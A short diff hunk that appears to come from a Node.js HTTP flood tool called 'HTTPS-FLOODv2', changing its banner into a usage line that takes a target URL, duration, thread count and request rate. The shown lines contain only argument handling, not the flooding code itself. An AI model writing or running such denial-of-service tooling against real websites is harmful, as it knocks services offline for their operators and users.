@@ -13,7 +13,7 @@ let headerbuilders,
   COOKIES = undefined,
   POSTDATA = undefined
 process.argv.length < 8 &&
-  (console.log('               HTTPS-FLOODv2 - Telephone (@telephone_cn)   '),
+  (console.log('node HTTPS-FLOODv2 <URL> <TIME> <THREAD> GET <RATE>'),
   console.log(''),
   process.exit(0))
 let randomparam = false
